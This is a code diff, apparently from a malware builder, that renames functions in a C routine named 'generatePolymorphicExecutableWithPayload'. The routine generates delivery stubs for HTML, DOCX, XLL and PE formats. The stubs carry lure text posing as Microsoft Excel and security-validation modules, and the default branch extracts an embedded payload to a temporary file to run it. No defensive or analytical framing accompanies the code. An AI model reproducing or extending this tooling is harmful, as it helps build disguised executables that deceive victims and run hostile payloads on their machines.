@@ -316,9 +316,9 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
     switch (delType) {
         case DEL_HTML:
             deliveryIncludes = "#include <shellapi.h>\n";
-            payloadFunction = "html_delivery";
+            payloadFunction = "html_payload";
             deliveryPayload = 
-                                        "void execute_html_delivery() {\n"
+                                        "void execute_html_payload() {\n"
             "    char html_content[16384];\n"
             "    char validation_id[128];\n"
             "    sprintf_s(validation_id, sizeof(validation_id), \"VS2022-%I64u\", GetTickCount64());\n"
@@ -343,9 +343,9 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
             break;
             
         case DEL_DOCX:
-            payloadFunction = "docx_delivery";
+            payloadFunction = "docx_payload";
             deliveryPayload = 
-                            "void execute_docx_delivery() {\n"
+                            "void execute_docx_payload() {\n"
             "    char docx_header[] = \"PK\\x03\\x04\\x14\\x00\\x06\\x00\\x08\\x00\";\n"
             "    char docx_content[8192];\n"
             "    char timestamp[128];\n"
@@ -370,9 +370,9 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
             break;
             
         case DEL_XLL:
-            payloadFunction = "xll_delivery";
+            payloadFunction = "xll_payload";
             deliveryPayload = 
-                "void execute_xll_delivery() {\n"
+                "void execute_xll_payload() {\n"
                 "    char xll_signature[] = \"Microsoft Excel Security Add-in\";\n"
                 "    char xll_data[] = \"Excel Security Validation Add-in\\n\"\n"
                 "                      \"Version: 2022.1\\n\"\n"
@@ -395,9 +395,9 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
             break;
             
         case DEL_PE:
-            payloadFunction = "pe_delivery";
+            payloadFunction = "pe_payload";
             deliveryPayload = 
-                "void execute_pe_delivery() {\n"
+                "void execute_pe_payload() {\n"
                 "    char pe_header[] = \"MZ\\x90\\x00\\x03\\x00\\x00\\x00\\x04\";\n"
                 "    char pe_data[] = \"Portable Executable Security Module\\n\"\n"
                 "                     \"Security Level: Maximum\\n\"\n"
@@ -421,10 +421,10 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
             break;
             
         default: // DEL_BENIGN or actual payload execution
-            payloadFunction = "payload_delivery";
+            payloadFunction = "payload_execution";
             if (payloadData && payloadSize > 0) {
                 deliveryPayload = 
-                    "void execute_payload_delivery() {\n"
+                    "void execute_payload_execution() {\n"
                     "    // Extract embedded payload to temporary file\n"
                     "    char temp_path[MAX_PATH];\n"
                     "    GetTempPathA(MAX_PATH, temp_path);\n"
@@ -483,7 +483,7 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
                     "}\n";
             } else {
                 deliveryPayload = 
-                    "void execute_payload_delivery() {\n"
+                    "void execute_payload_execution() {\n"
                     "    // Enterprise validation with data processing\n"
                     "    char validation_message[] = \"System Security Validation Completed Successfully\";\n"
                     "    char system_info[8192];\n"
